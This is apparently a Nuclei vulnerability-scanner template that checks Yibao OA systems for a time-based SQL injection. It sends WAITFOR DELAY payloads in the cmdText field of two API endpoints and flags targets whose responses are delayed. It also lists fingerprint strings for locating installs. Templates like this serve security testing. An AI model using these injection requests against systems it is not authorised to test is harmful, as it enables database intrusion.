content:
id: yibao-OA-ExecuteQueryNoneResult-sqli

info:
  name: 易宝OA-ExecuteQueryNoneResult(或ExecuteQueryForDataSetBinary)-SQL注入漏洞
  author: CyberCG
  severity: high
  description: body="topvision_oaName"||title="欢迎登录易宝OA系统" || banner="易宝OA"
  reference:
    - https://
  tags: tags

http:
  - raw:
      - |
        POST /api/system/ExecuteQueryNoneResult HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Baiduspider-render/2.0
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 48

        token=zxh&cmdText=;WAITFOR DELAY '0:0:4'--+
      - |
        POST /api/system/ExecuteQueryNoneResult HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Baiduspider-render/2.0
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 48

        token=zxh&cmdText=;WAITFOR DELAY '0:0:8'--+
      - |
        POST /api/system/ExecuteQueryForDataSetBinary HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Baiduspider-render/2.0
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 48

        token=zxh&cmdText=;WAITFOR DELAY '0:0:4'--+
      - |
        POST /api/system/ExecuteQueryForDataSetBinary HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Baiduspider-render/2.0
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 48

        token=zxh&cmdText=;WAITFOR DELAY '0:0:8'--+
        


    stop-at-first-match: true  #ExecuteQueryNoneResult存在延迟注入，则不再对ExecuteQueryNoneResult接口检测
    matchers:
      - type: dsl
        dsl:
          - status_code==200 && duration_1>4 && duration_2>8
          - status_code==200 &&  duration_3>4 && duration_4>8
author: Sud0
